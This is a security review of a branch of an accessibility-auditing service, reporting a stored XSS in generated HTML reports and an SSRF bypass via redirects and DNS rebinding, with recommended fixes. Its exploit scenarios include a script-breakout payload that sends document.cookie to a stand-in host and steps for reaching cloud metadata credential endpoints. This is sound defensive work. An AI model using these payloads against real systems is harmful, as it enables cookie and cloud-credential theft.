# Security Review — `production` branch

**Date:** 2026-09-03
**Scope:** Security-focused review of changes on the `production` branch (server-side code: `ka11y-python/` FastAPI, `ka11y-node/` Express servers, `ka11y-ui/` API routes). Documentation, locale files, and unit-test-only files were deprioritized.

**Result:** Two high-confidence vulnerabilities. Both are reachable in the current server-side code and both survived independent false-positive verification (confidence 8/10 each).

---

## Vuln 1: XSS — `ka11y-node/src/utils/reportGenerator.js:159` (data flow from `:41`–`:59`)

* **Severity:** High
* **Category:** `xss` (stored/DOM XSS via HTML report generation)
* **Confidence:** 8/10

### Description

`generateReport()` embeds audit findings into a **bare inline `<script>` block** with no context-aware escaping:

```js
// reportGenerator.js:41
const violationsJson = JSON.stringify(violations.map(f => ({
  ... html: f.element.html || null, reason: f.reason || '', ...
})));
// reportGenerator.js:158-161
<script>
const V=${violationsJson};
const M=${markersJson};
```

`f.element.html` is raw `outerHTML` captured from the audited page, truncated to 600 chars with **no sanitization** (`ka11y-node/src/utils/axeResultMapper.js:463` for axe nodes; `normalizeElement` `:632` and `inferElementsFromReason` `:680` for custom checks). `JSON.stringify` escapes `"` and `\` but **not** `<`, `>`, or `/`, so markup from the audited page containing `</script><script>…</script>` terminates the report's script element early and the remainder is parsed as live HTML/JS.

`escapeHtml()` (`:3`) is applied to the *static* HTML sections but is **not** applied to `violationsJson` at `:159`.

The report is returned as `text/html` from an unauthenticated endpoint with **no `Content-Security-Policy`**:

```js
// ka11y-node/src/controllers/accessibility.controller.js:446-449
res.setHeader('Content-Type', 'text/html; charset=utf-8');
res.send(html);
```

Route `POST /api/v1/analyse-url/report` (`ka11y-node/server.js:104`). `server.js:46-52` sets `X-Content-Type-Options`, `X-Frame-Options`, `X-XSS-Protection`, `Referrer-Policy` — but no CSP and no `helmet`.

### Exploit Scenario

1. Attacker hosts a page containing an element axe-core will flag, carrying a breakout payload in an attribute that is serialized verbatim, e.g.
   `<input aria-describedby="missing" placeholder="</script><script>fetch('https://evil.example/c?'+document.cookie)</script>">`
2. Anyone calls `POST /api/v1/analyse-url/report` with `{"url":"https://attacker/x"}`.
3. The returned report contains `const V=[{... "html":"<input ... </script><script>fetch(...)</script> ...">}]`. The first `</script>` closes the report script; the injected script executes in the **ka11y-node origin** when the report is opened in a browser.
4. Attacker JS runs with the trust of the ka11y service origin: call the unauthenticated ka11y APIs, read anything that origin stores, and serve phishing from a trusted host.

### Recommendation

* Neutralize the script-context breakout before embedding:

  ```js
  const toScriptJson = obj => JSON.stringify(obj)
    .replace(/</g,'\\u003c').replace(/>/g,'\\u003e').replace(/&/g,'\\u0026')
    .replace(/\u2028/g,'\\u2028').replace(/\u2029/g,'\\u2029');
  ```

  Apply to `violationsJson` and `markersJson`.
* Prefer moving the payload into `<script type="application/json" id="v-data">…</script>` (HTML-escaped text content) and `JSON.parse` client-side.
* Add a restrictive `Content-Security-Policy` to the report response with a nonce for the one inline script.
* (Minor / defense-in-depth) the client-side `eh()` at `reportGenerator.js:166` does not escape `'`; harmless as written since its only attribute sink (`:215`) is double-quoted, but escape `'` too if any single-quoted attribute sink is ever added.

---

## Vuln 2: SSRF via redirect / DNS rebinding — `ka11y-node/src/services/accessibility.service.js:75`–`117`

* **Severity:** High (deployment-dependent: cloud metadata / internal-service read on cloud hosts; Medium if no internal network reachable)
* **Category:** `ssrf`
* **Confidence:** 8/10

### Description

The entry-point guard `_assertPublicUrl()` (`:75-99`) does a real `dns.lookup(hostname, {all:true})` and rejects private/reserved results — but it runs **only on the caller-supplied root URL** (`analyseUrlReport` `:517`, `analyseUrl` `:721`, `analyseUrlFlat` `:1015`, batch `:930`). It is never re-run for redirects or BFS child URLs.

Redirects are policed only by `_installSsrfInterceptor()` (`:104-117`):

```js
page.on("request", (request) => {
  const { hostname } = new URL(request.url());
  if (_PRIVATE_IP_RE.some((re) => re.test(hostname))) {
    request.abort("addressunreachable"); return;
  }
  request.continue();
});
```

This **string-matches the hostname against literal private-IP regexes and performs no DNS resolution**. Two bypasses:

1. **Redirect to an internal DNS name.** An attacker page 302s to `http://instance-data/latest/meta-data/…` (AWS IMDSv1), `http://metadata.google.internal/…`, or any `http://internal-service.corp/`. The interceptor sees a non-IP hostname, no regex matches, `request.continue()` — Chromium connects to the private IP. Encoded-IP forms (`http://0x7f000001/`) in a redirect also slip past the dotted-quad regexes.
2. **DNS rebinding.** `_assertPublicUrl` resolves `rebind.evil` to a public A record at check time; Chromium re-resolves independently seconds later (no `--host-resolver-rules` pinning in `ka11y-node/src/config/app.config.js`) and the attacker's TTL-0 record now returns a private address. The interceptor never resolves, so it `continue()`s.

The Python side already closes this exact gap (`ka11y-python/ka11y/crawler/_ssrf_guard.py` resolves every non-literal host, redirects included, inside the route handler); the Node service has no equivalent.

**Read-back primitive confirmed:** `POST /api/v1/analyse-url/report` returns a full-page base64 screenshot (`:569`) and per-element screenshots; `POST /api/v1/analyse-url` / `-flat` / `-wcag` and `POST /api/v1/rules/:successCriteriaId/analyse-url` return failing elements' outer HTML/text; `GET /api/ka11y/combined` (`server.js:136`) and `POST /api/ka11y/combined` (`combined-server.js:16`) echo `node_result` in the JSON response.

**All entry points are unauthenticated** — `server.js` / `combined-server.js` install only security headers, a CORS allowlist (browser-only), body parsing, and logging; no auth middleware.

### Exploit Scenario

1. Attacker controls `http://rebind.evil/` with TTL 0, initially answering a public IP.
2. Attacker submits `POST /api/v1/analyse-url-wcag {"url":"http://rebind.evil/"}`. `_assertPublicUrl` resolves the public IP and allows it.
3. Before/while Chromium navigates, the attacker flips the DNS answer to `169.254.169.254` (or an RFC-1918 host). The interceptor sees hostname `rebind.evil` (not an IP literal) and lets the request through.
   * Simpler variant needing no rebinding: the attacker page just 302-redirects to `http://instance-data/latest/meta-data/iam/security-credentials/…`.
4. On AWS IMDSv1 or generic internal HTTP services, the crawler fetches internal content; screenshots / HTML snippets are returned to the attacker in the audit response — a read primitive for internal services and potentially IAM credentials.

### Mitigations already present (reduce, don't remove, the risk)

* Direct submission of a private hostname/IP is blocked by `_assertPublicUrl`.
* The interceptor does block redirects to *literal* private IPs.
* BFS link-following is confined to the exact base host (`ka11y-node/src/utils/crawl.js:115`).
* GCP metadata needs a `Metadata-Flavor` header a redirect can't set; AWS IMDSv2, if enforced, needs a PUT token. AWS IMDSv1 and internal services have no such barrier.

### Recommendation

* Make `_installSsrfInterceptor` async and, for navigation + redirect requests, `await dns.lookup(hostname, {all:true})` and `request.abort()` on any private/reserved/link-local result — mirror `ssrf_host_is_blocked` in the Python guard. Normalize encoded-IP forms.
* Close the browser-resolver TOCTOU: resolve once in `_assertPublicUrl`, then pin with `--host-resolver-rules="MAP <host> <vetted-ip>"` at launch (or connect via a pinned socket).
* Add an explicit `http:`/`https:` protocol allowlist to all `/api/v1/*` URL entry points (currently only the `/api/ka11y/combined` handlers check protocol).
* Defense in depth: run the crawler browser with egress filtering that blocks `10/8`, `172.16/12`, `192.168/16`, `127/8`, and `169.254.0.0/16`.

---

## Areas checked — no credible new vulnerability found

* **SQL injection** (`ka11y-python/ka11y/store/db.py`, `store/repo.py`, `store/assets.py`, `api/v1/assets.py`): all queries parameterized. The one dynamic fragment, `repo.update_run()` (`repo.py:88`), builds only column names from hard-coded caller kwargs, never from request data.
* **Path traversal in asset/image serving**: `GET /api/v1/assets/{id}` enforces `abs_path.relative_to(base)` (`store/assets.py:150-170`). The legacy `GET /api/v1/combined/{job_id}/image?path=` (`combined/routes.py:642-720`) requires the path to exactly match one recorded in that job's report and to stay within the output root. Both adequately guarded.
* **Command injection / RCE**: no `subprocess` / `os.system` / `eval` / `pickle` / unsafe `yaml.load` in the Python backend (`yaml.safe_load` throughout). Node `child_process` uses are a static `python3 -c "..."` string with no interpolation (`server.js:181`) and `spawn('npm', [...])` with array args in a dev-only script not wired to any route. `new Function(...)` in `src/audits/**` and `src/custom-checks/**` operates on hard-coded helper source, not request data.
* **SSRF on the Python entry points**: `combined/routes.py:assert_public_url` resolves and blocks private IPs on submit, and the Playwright contexts get a resolving route guard via `crawler/_ssrf_guard.py` / `browser_pool.py` / `optimized/engine.py`. `POST /api/v1/test/rule` skips `assert_public_url` but its crawls still run through the guarded contexts.
* **Email header injection** (`ka11y/utils/gmail_sender.py` / `report_mail.py`): the `email` field is constrained by anchored pattern `^[^@\s]+@[^@\s]+\.[^@\s]+$` (`\s` excludes CR/LF) on every submission path. CRLF injection into `msg["To"]` is blocked.
* **CORS / auth**: Python `CORSMiddleware` uses a fixed origin allowlist (not reflected); Node sets ACAO only for allowlisted `Origin` values. There is no authentication layer anywhere in the project — this is the existing design, not introduced or regressed by this branch.
* **CSV formula injection** (`ka11y/utils/report_csv.py`, `ka11y-ui/src/lib/wcagAudit.ts`): fields such as page URLs are not prefixed to neutralize `=`/`+`/`-`/`@` for spreadsheet apps. Low impact and a known lower-severity class; noted for completeness only.
